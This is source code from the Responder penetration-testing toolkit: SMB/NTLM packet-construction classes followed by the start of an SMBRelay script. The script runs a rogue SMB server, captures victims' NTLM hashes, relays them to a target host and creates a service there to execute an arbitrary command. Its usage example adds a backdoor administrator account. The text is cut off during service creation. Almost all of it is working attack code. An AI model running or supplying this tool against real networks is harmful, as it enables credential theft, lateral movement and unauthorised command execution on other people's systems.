        ("Tag3ASNId",             "\x04"),
        ("Tag3ASNIdLenOfLen",     "\x81"),
        ("Tag3ASNIdLen",          "\xEA"),
        ("NTLMSSPSignature",      "NTLMSSP"),
        ("NTLMSSPSignatureNull",  "\x00"),
        ("NTLMSSPMessageType",    "\x02\x00\x00\x00"),
        ("NTLMSSPNtWorkstationLen","\x1e\x00"),
        ("NTLMSSPNtWorkstationMaxLen","\x1e\x00"),
        ("NTLMSSPNtWorkstationBuffOffset","\x38\x00\x00\x00"),
        ("NTLMSSPNtNegotiateFlags","\x15\x82\x89\xe2"),
        ("NTLMSSPNtServerChallenge","\x81\x22\x33\x34\x55\x46\xe7\x88"),
        ("NTLMSSPNtReserved","\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("NTLMSSPNtTargetInfoLen","\x94\x00"),
        ("NTLMSSPNtTargetInfoMaxLen","\x94\x00"),
        ("NTLMSSPNtTargetInfoBuffOffset","\x56\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionHigh","\x05"),
        ("NegTokenInitSeqMechMessageVersionLow","\x02"),
        ("NegTokenInitSeqMechMessageVersionBuilt","\xce\x0e"),
        ("NegTokenInitSeqMechMessageVersionReserved","\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionNTLMType","\x0f"),
        ("NTLMSSPNtWorkstationName","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairsId","\x02\x00"),
        ("NTLMSSPNTLMChallengeAVPairsLen","\x0a\x00"),
        ("NTLMSSPNTLMChallengeAVPairsUnicodeStr","smb12"),
        ("NTLMSSPNTLMChallengeAVPairs1Id","\x01\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1Len","\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1UnicodeStr","SERVER2008"), 
        ("NTLMSSPNTLMChallengeAVPairs2Id","\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2Len","\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2UnicodeStr","smb12.local"), 
        ("NTLMSSPNTLMChallengeAVPairs3Id","\x03\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3Len","\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3UnicodeStr","SERVER2008.smb12.local"),
        ("NTLMSSPNTLMChallengeAVPairs5Id","\x05\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5Len","\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5UnicodeStr","smb12.local"),
        ("NTLMSSPNTLMChallengeAVPairs6Id","\x00\x00"),
        ("NTLMSSPNTLMChallengeAVPairs6Len","\x00\x00"),
        ("NTLMSSPNTLMPadding",             ""),
        ("NativeOs","Windows Server 2003 3790 Service Pack 2"),                           
        ("NativeOsTerminator","\x00\x00"),
        ("NativeLAN", "Windows Server 2003 5.2"),
        ("NativeLANTerminator","\x00\x00"),
    ])


    def calculate(self):

        ##Convert strings to Unicode first...
        self.fields["NTLMSSPNtWorkstationName"] = self.fields["NTLMSSPNtWorkstationName"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"].encode('utf-16le')
        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
        self.fields["NativeLAN"] = self.fields["NativeLAN"].encode('utf-16le')

        ###### SecBlobLen Calc:
        AsnLen= str(self.fields["ChoiceTagASNId"])+str(self.fields["ChoiceTagASNLenOfLen"])+str(self.fields["ChoiceTagASNIdLen"])+str(self.fields["NegTokenTagASNId"])+str(self.fields["NegTokenTagASNLenOfLen"])+str(self.fields["NegTokenTagASNIdLen"])+str(self.fields["Tag0ASNId"])+str(self.fields["Tag0ASNIdLen"])+str(self.fields["NegoStateASNId"])+str(self.fields["NegoStateASNLen"])+str(self.fields["NegoStateASNValue"])+str(self.fields["Tag1ASNId"])+str(self.fields["Tag1ASNIdLen"])+str(self.fields["Tag1ASNId2"])+str(self.fields["Tag1ASNId2Len"])+str(self.fields["Tag1ASNId2Str"])+str(self.fields["Tag2ASNId"])+str(self.fields["Tag2ASNIdLenOfLen"])+str(self.fields["Tag2ASNIdLen"])+str(self.fields["Tag3ASNId"])+str(self.fields["Tag3ASNIdLenOfLen"])+str(self.fields["Tag3ASNIdLen"])

        CalculateSecBlob = str(self.fields["NTLMSSPSignature"])+str(self.fields["NTLMSSPSignatureNull"])+str(self.fields["NTLMSSPMessageType"])+str(self.fields["NTLMSSPNtWorkstationLen"])+str(self.fields["NTLMSSPNtWorkstationMaxLen"])+str(self.fields["NTLMSSPNtWorkstationBuffOffset"])+str(self.fields["NTLMSSPNtNegotiateFlags"])+str(self.fields["NTLMSSPNtServerChallenge"])+str(self.fields["NTLMSSPNtReserved"])+str(self.fields["NTLMSSPNtTargetInfoLen"])+str(self.fields["NTLMSSPNtTargetInfoMaxLen"])+str(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])+str(self.fields["NTLMSSPNtWorkstationName"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])

        ##### Bcc len
        BccLen = AsnLen+CalculateSecBlob+str(self.fields["NTLMSSPNTLMPadding"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLAN"])+str(self.fields["NativeLANTerminator"])
        #SecBlobLen
        self.fields["SecBlobLen"] = struct.pack("<h", len(AsnLen+CalculateSecBlob))
        self.fields["Bcc"] = struct.pack("<h", len(BccLen))
        self.fields["ChoiceTagASNIdLen"] = struct.pack(">B", len(AsnLen+CalculateSecBlob)-3)
        self.fields["NegTokenTagASNIdLen"] = struct.pack(">B", len(AsnLen+CalculateSecBlob)-6)
        self.fields["Tag1ASNIdLen"] = struct.pack(">B", len(str(self.fields["Tag1ASNId2"])+str(self.fields["Tag1ASNId2Len"])+str(self.fields["Tag1ASNId2Str"])))
        self.fields["Tag1ASNId2Len"] = struct.pack(">B", len(str(self.fields["Tag1ASNId2Str"])))
        self.fields["Tag2ASNIdLen"] = struct.pack(">B", len(CalculateSecBlob+str(self.fields["Tag3ASNId"])+str(self.fields["Tag3ASNIdLenOfLen"])+str(self.fields["Tag3ASNIdLen"])))
        self.fields["Tag3ASNIdLen"] = struct.pack(">B", len(CalculateSecBlob))

        ###### Andxoffset calculation.
        CalculateCompletePacket = str(self.fields["Wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["Reserved"])+str(self.fields["Andxoffset"])+str(self.fields["Action"])+str(self.fields["SecBlobLen"])+str(self.fields["Bcc"])+BccLen

        self.fields["Andxoffset"] = struct.pack("<h", len(CalculateCompletePacket)+32)
        ###### Workstation Offset
        CalculateOffsetWorkstation = str(self.fields["NTLMSSPSignature"])+str(self.fields["NTLMSSPSignatureNull"])+str(self.fields["NTLMSSPMessageType"])+str(self.fields["NTLMSSPNtWorkstationLen"])+str(self.fields["NTLMSSPNtWorkstationMaxLen"])+str(self.fields["NTLMSSPNtWorkstationBuffOffset"])+str(self.fields["NTLMSSPNtNegotiateFlags"])+str(self.fields["NTLMSSPNtServerChallenge"])+str(self.fields["NTLMSSPNtReserved"])+str(self.fields["NTLMSSPNtTargetInfoLen"])+str(self.fields["NTLMSSPNtTargetInfoMaxLen"])+str(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

        ###### AvPairs Offset
        CalculateLenAvpairs = str(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])

        ##### Workstation Offset Calculation:
        self.fields["NTLMSSPNtWorkstationBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation))
        self.fields["NTLMSSPNtWorkstationLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtWorkstationMaxLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))

        ##### IvPairs Offset Calculation:
        self.fields["NTLMSSPNtTargetInfoBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtTargetInfoLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        self.fields["NTLMSSPNtTargetInfoMaxLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        ##### IvPair Calculation:
        self.fields["NTLMSSPNTLMChallengeAVPairs5Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs3Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs2Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs1Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairsLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])))

##################################################################################

class SMBSession2Accept(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x04"),
        ("AndXCommand",           "\xff"),
        ("Reserved",              "\x00"),
        ("Andxoffset",            "\xb4\x00"),
        ("Action",                "\x00\x00"),
        ("SecBlobLen",            "\x09\x00"),
        ("Bcc",                   "\x89\x01"),
        ("SSPIAccept","\xa1\x07\x30\x05\xa0\x03\x0a\x01\x00"),
        ("NativeOs","Windows Server 2003 3790 Service Pack 2"),                           
        ("NativeOsTerminator","\x00\x00"),
        ("NativeLAN", "Windows Server 2003 5.2"),
        ("NativeLANTerminator","\x00\x00"),
    ])
    def calculate(self):
        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
        self.fields["NativeLAN"] = self.fields["NativeLAN"].encode('utf-16le')
        BccLen = str(self.fields["SSPIAccept"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLAN"])+str(self.fields["NativeLANTerminator"])
        self.fields["Bcc"] = struct.pack("<h", len(BccLen))

class SMBSessEmpty(Packet):
    fields = OrderedDict([
        ("Empty",       "\x00\x00\x00"),
    ])

class SMBTreeData(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x07"),
        ("AndXCommand", "\xff"),
        ("Reserved","\x00" ),
        ("Andxoffset", "\xbd\x00"),
        ("OptionalSupport","\x00\x00"),
        ("MaxShareAccessRight","\x00\x00\x00\x00"),
        ("GuestShareAccessRight","\x00\x00\x00\x00"),
        ("Bcc", "\x94\x00"),
        ("Service", "IPC"),
        ("ServiceTerminator","\x00\x00\x00\x00"),                           
    ])


    def calculate(self):
        #Complete Packet Len
        CompletePacket= str(self.fields["Wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["Reserved"])+str(self.fields["Andxoffset"])+str(self.fields["OptionalSupport"])+str(self.fields["MaxShareAccessRight"])+str(self.fields["GuestShareAccessRight"])+str(self.fields["Bcc"])+str(self.fields["Service"])+str(self.fields["ServiceTerminator"])
        ## AndXOffset
        self.fields["Andxoffset"] = struct.pack("<H", len(CompletePacket)+32)
        ## BCC Len Calc
        BccLen= str(self.fields["Service"])+str(self.fields["ServiceTerminator"])
        self.fields["Bcc"] = struct.pack("<H", len(BccLen))

# SMB Session/Tree Answer.
class SMBSessTreeAns(Packet):
    fields = OrderedDict([
        ("Wordcount",       "\x03"),
        ("Command",         "\x75"), 
        ("Reserved",        "\x00"),
        ("AndXoffset",      "\x4e\x00"),
        ("Action",          "\x01\x00"),
        ("Bcc",             "\x25\x00"),
        ("NativeOs",        "Windows 5.1"),
        ("NativeOsNull",    "\x00"),
        ("NativeLan",       "Windows 2000 LAN Manager"),
        ("NativeLanNull",   "\x00"),
        ("WordcountTree",   "\x03"),
        ("AndXCommand",     "\xff"),
        ("Reserved1",       "\x00"),
        ("AndxOffset",      "\x00\x00"),
        ("OptionalSupport", "\x01\x00"),
        ("Bcc2",            "\x08\x00"),
        ("Service",         "A:"),
        ("ServiceNull",     "\x00"),
        ("FileSystem",      "NTFS"),
        ("FileSystemNull",  "\x00"),

    ])

    def calculate(self):
        ##AndxOffset
        CalculateCompletePacket = str(self.fields["Wordcount"])+str(self.fields["Command"])+str(self.fields["Reserved"])+str(self.fields["AndXoffset"])+str(self.fields["Action"])+str(self.fields["Bcc"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanNull"])
        self.fields["AndXoffset"] = struct.pack("<i", len(CalculateCompletePacket)+32)[:2]
        ##BCC 1 and 2
        CompleteBCCLen =  str(self.fields["NativeOs"])+str(self.fields["NativeOsNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanNull"])
        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
        CompleteBCC2Len = str(self.fields["Service"])+str(self.fields["ServiceNull"])+str(self.fields["FileSystem"])+str(self.fields["FileSystemNull"])
        self.fields["Bcc2"] = struct.pack("<h",len(CompleteBCC2Len))

########NEW FILE########
__FILENAME__ = SMBRelay
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2014 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys, os, struct,re,socket,random, RelayPackets,optparse,thread
from FingerprintRelay import RunSmbFinger
from odict import OrderedDict
from socket import *
from RelayPackets import *

def UserCallBack(op, value, dmy, parser):
        args=[]
        for arg in parser.rargs:
                if arg[0] != "-":
                        args.append(arg)
        if getattr(parser.values, op.dest):
                args.extend(getattr(parser.values, op.dest))
        setattr(parser.values, op.dest, args)

parser = optparse.OptionParser(usage="python %prog -i 10.20.30.40 -c 'net user Responder Quol0eeP/e}X /add &&net localgroup administrators Responder /add' -t 10.20.30.45 -u Administrator lgandx admin",
                               prog=sys.argv[0],
                               )
parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")

parser.add_option('-c',action='store', help='Command to run on the target.',metavar='"net user Responder Quol0eeP/e}X /ADD"',dest='CMD')

parser.add_option('-t',action="store", help="Target server for SMB relay.",metavar="10.20.30.45",dest="TARGET")

parser.add_option('-d',action="store", help="Target Domain for SMB relay (optional). This can be set to overwrite a domain logon (DOMAIN\Username) with the gathered credentials. Woks on NTLMv1",metavar="WORKGROUP",dest="Domain")

parser.add_option('-u', '--UserToRelay', action="callback", callback=UserCallBack, dest="UserToRelay")

options, args = parser.parse_args()

if options.CMD is None:
   print "\n-c mandatory option is missing, please provide a command to execute on the target.\n"
   parser.print_help()
   exit(-1)

if options.TARGET is None:
   print "\n-t mandatory option is missing, please provide a target.\n"
   parser.print_help()
   exit(-1)

if options.UserToRelay is None:
   print "\n-u mandatory option is missing, please provide a username to relay.\n"
   parser.print_help()
   exit(-1)

ResponderPATH = os.path.dirname(__file__)
# Set some vars.
UserToRelay = options.UserToRelay
Domain  = options.Domain
Command  = options.CMD
Target = options.TARGET
OURIP = options.OURIP

print "\nResponder SMBRelay 0.1\nPlease send bugs/comments to: lgaffie@trustwave.com"
print '\033[31m'+'Use this script in combination with Responder.py for best results (remember to set SMB = Off in Responder.conf)..\nUsernames  to relay (-u) are case sensitive.'+'\033[0m'
print 'To kill this script hit CRTL-C or Enter\nWill relay credentials for these users: '+'\033[1m\033[34m'+', '.join(UserToRelay)+'\033[0m\n' 

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

#Logger
import logging
Logs = logging
Logs.basicConfig(filemode="w",filename='SMBRelay-Session.txt',format='',level=logging.DEBUG)

#Function used to verify if a previous auth attempt was made.
def ReadData(outfile,Client, User, cmd=None):
    try:
       with open(ResponderPATH+outfile,"r") as filestr:
          if cmd == None:
             String = Client+':'+User
             if re.search(String.encode('hex'), filestr.read().encode('hex')):
                filestr.close()
                return True
             else:
                return False
          if cmd != None:
             String = Client+","+User+","+cmd
             if re.search(String.encode('hex'), filestr.read().encode('hex')):
                filestr.close()
                print "[+] Command: %s was previously executed on host: %s. Won't execute again.\n" %(cmd, Client)
                return True
             else:
                return False           

    except:
       raise

#Function used to parse SMB NTLMv1/v2 
def ParseHash(data,Client, Target):
  try:
    lenght = struct.unpack('<H',data[43:45])[0]
    LMhashLen = struct.unpack('<H',data[51:53])[0]
    NthashLen = struct.unpack('<H',data[53:55])[0]
    Bcc = struct.unpack('<H',data[63:65])[0]
    if NthashLen >= 30:
       Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
       pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
       var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
       Username, Domain = tuple(var)
       if ReadData("SMBRelay-Session.txt", Client, Username):
          print "[+]Auth from user %s with host %s previously failed. Won't relay."%(Username, Client)
          pass
       if Username in UserToRelay:
          print '%s sent a NTLMv2 Response..\nVictim OS is : %s. Passing credentials to: %s'%(Client,RunSmbFinger((Client, 445)),Target)
          print "Username : ",Username
          print "Domain (if joined, if not then computer name) : ",Domain
          return data[65:65+LMhashLen],data[65+LMhashLen:65+LMhashLen+NthashLen],Username,Domain, Client
    if NthashLen == 24:
       pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
       var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
       Username, Domain = tuple(var)
       if ReadData("SMBRelay-Session.txt", Client, Username):
          print "Auth from user %s with host %s previously failed. Won't relay."%(Username, Client)
          pass
       if Username in UserToRelay:
          print '%s sent a NTLMv1 Response..\nVictim OS is : %s. Passing credentials to: %s'%(Client,RunSmbFinger((Client, 445)),Target)
          LMHashing = data[65:65+LMhashLen].encode('hex').upper()
          NTHashing = data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()
          print "Username : ",Username
          print "Domain (if joined, if not then computer name) : ",Domain
          return data[65:65+LMhashLen],data[65+LMhashLen:65+LMhashLen+NthashLen],Username,Domain, Client
       else:
          print "'%s' user was not specified in -u option, won't relay authentication. Allowed users to relay are: %s"%(Username,UserToRelay)
          pass


  except Exception:
    raise

#Detect if SMB auth was Anonymous
def Is_Anonymous(data):
    LMhashLen = struct.unpack('<H',data[51:53])[0]
    if LMhashLen == 0 or LMhashLen == 1:
       print "SMB Anonymous login requested, trying to force client to auth with credz."
       return True
    else:
       return False

def ParseDomain(data):
    Domain = ''.join(data[81:].split('\x00\x00\x00')[:1])+'\x00\x00\x00'
    return Domain

#Function used to know which dialect number to return for NT LM 0.12
def Parse_Nego_Dialect(data):
    DialectStart = data[40:]
    pack = tuple(DialectStart.split('\x02'))[:10]
    var = [e.replace('\x00','') for e in DialectStart.split('\x02')[:10]]
    test = tuple(var)
    if test[0] == "NT LM 0.12":
       return "\x00\x00"
    if test[1] == "NT LM 0.12":
       return "\x01\x00"
    if test[2] == "NT LM 0.12":
       return "\x02\x00"
    if test[3] == "NT LM 0.12":
       return "\x03\x00"
    if test[4] == "NT LM 0.12":
       return "\x04\x00"
    if test[5] == "NT LM 0.12":
       return "\x05\x00"
    if test[6] == "NT LM 0.12":
       return "\x06\x00"
    if test[7] == "NT LM 0.12":
       return "\x07\x00"
    if test[8] == "NT LM 0.12":
       return "\x08\x00"
    if test[9] == "NT LM 0.12":
       return "\x09\x00"
    if test[10] == "NT LM 0.12":
       return "\x0a\x00"

def SmbRogueSrv139(key,Target,DomainMachineName):
    s = socket(AF_INET,SOCK_STREAM)
    s.setsockopt(SOL_SOCKET,SO_REUSEADDR, 1)
    s.settimeout(30)
    try:
       s.bind(('0.0.0.0', 139))
       s.listen(0)
       conn, addr = s.accept()
    except error, msg:
       if "Address already in use" in msg:
          print '\033[31m'+'Something is already listening on TCP 139, did you set SMB = Off in Responder.conf..?\nSMB Relay will not work.'+'\033[0m'
       
    try:
       while True:
         data = conn.recv(1024)
         ##session request 139
         if data[0] == "\x81":
            buffer0 = "\x82\x00\x00\x00"         
            conn.send(buffer0)
         ##Negotiate proto answer.
         if data[8:10] == "\x72\x00":
            head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc8",pid=pidcalc(data),tid=tidcalc(data))
            t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data),Key=key,Domain=DomainMachineName)
            t.calculate()
            packet1 = str(head)+str(t)
            buffer1 = longueur(packet1)+packet1
            conn.send(buffer1)
            ##Session Setup AndX Request
         if data[8:10] == "\x73\x00":
            if Is_Anonymous(data):
               head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x03\xc8",errorcode="\x6d\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
               packet1 = str(head)+str(SMBSessEmpty())
               buffer1 = longueur(packet1)+packet1  
               conn.send(buffer1)
            else:
               head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x03\xc8",errorcode="\x6d\x00\x00\xC0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
               packet1 = str(head)+str(SMBSessEmpty())#Return login fail anyways.
               buffer1 = longueur(packet1)+packet1  
               conn.send(buffer1)
               Credz = ParseHash(data,addr[0],Target)
               return Credz
    except:
       return None

def RunRelay(host, Command,Domain):
    Target = host
    CMD = Command
    print "Target is running: ", RunSmbFinger((host, 445))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, 445))
    h = SMBHeader(cmd="\x72",flag1="\x18",flag2="\x03\xc7",pid="\xff\xfe", tid="\xff\xff")
    n = SMBNego(Data = SMBNegoData())
    n.calculate()
    packet0 = str(h)+str(n)
    buffer0 = longueur(packet0)+packet0
    s.send(buffer0)
    data = s.recv(2048)
    Key = ParseAnswerKey(data,host)
    DomainMachineName = ParseDomain(data)
    if data[8:10] == "\x72\x00":
       try: 
          a = SmbRogueSrv139(Key,Target,DomainMachineName)
          if a is not None:
             LMHash,NTHash,Username,OriginalDomain, CLIENTIP = a
             if Domain == None:
                Domain = OriginalDomain
             if ReadData("SMBRelay-Session.txt", Target, Username, CMD):
                pass
             else:
                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x03\xc8",pid="\xff\xfe",mid="\x01\x00")
                t = SMBSessionTreeData(AnsiPasswd=LMHash,UnicodePasswd=NTHash,Username=Username,Domain=Domain,Targ=Target)
                t.calculate()
                packet0 = str(head)+str(t)
                buffer1 = longueur(packet0)+packet0
                s.send(buffer1)
                data = s.recv(2048)
       except:
          raise
          a = None
    if data[8:10] == "\x73\x6d":
          print "[+] Relay failed, auth denied. This user doesn't have an account on this target."
          Logs.info(CLIENTIP+":"+Username)
    if data[8:10] == "\x73\x0d":
          print "[+] Relay failed, SessionSetupAndX returned invalid parameter. It's most likely because both client and server are >=Windows Vista"
          Logs.info(CLIENTIP+":"+Username)
       ## NtCreateAndx
    if data[8:10] == "\x73\x00":
          print "[+] Authenticated, trying to PSexec on target !"
          head = SMBHeader(cmd="\xa2",flag1="\x18", flag2="\x02\x28",mid="\x03\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
          t = SMBNTCreateData()
          t.calculate()
          packet0 = str(head)+str(t)
          buffer1 = longueur(packet0)+packet0  
          s.send(buffer1)
          data = s.recv(2048)
       ## Fail Handling.
    if data[8:10] == "\xa2\x22":
          print "[+] Exploit failed, NT_CREATE denied. SMB Signing mandatory or this user has no privileges on this workstation?"
       ## DCE/RPC Write.
    if data[8:10] == "\xa2\x00":
          head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
          x = SMBDCEData()
          x.calculate()
          f = data[42:44]
          t = SMBWriteData(FID=f,Data=x)
          t.calculate()
          packet0 = str(head)+str(t)
          buffer1 = longueur(packet0)+packet0  
          s.send(buffer1)
          data = s.recv(2048)
          ## DCE/RPC Read.
          if data[8:10] == "\x2f\x00":
             head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x05\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
             t = SMBReadData(FID=f)
             t.calculate()
             packet0 = str(head)+str(t)
             buffer1 = longueur(packet0)+packet0  
             s.send(buffer1)
             data = s.recv(2048)
             ## DCE/RPC SVCCTLOpenManagerW.
             if data[8:10] == "\x2e\x00":
                head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x06\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x03\x00")
                w.calculate()
                x = SMBDCEPacketData(Data=w)
                x.calculate()
                t = SMBWriteData(FID=f,Data=x)
                t.calculate()
                packet0 = str(head)+str(t)
                buffer1 = longueur(packet0)+packet0  
                s.send(buffer1)
                data = s.recv(2048)
                ## DCE/RPC Read Answer.
                if data[8:10] == "\x2f\x00":
                   head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x07\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                   t = SMBReadData(FID=f)
                   t.calculate()
                   packet0 = str(head)+str(t)
                   buffer1 = longueur(packet0)+packet0  
                   s.send(buffer1)
                   data = s.recv(2048)
                   ## DCE/RPC SVCCTLCreateService.
                   if data[8:10] == "\x2e\x00":
                      if data[len(data)-4:] == "\x05\x00\x00\x00":
                         print "[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?"
                      print "[+] Creating service"
                      head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
                      ContextHandler = data[88:108]
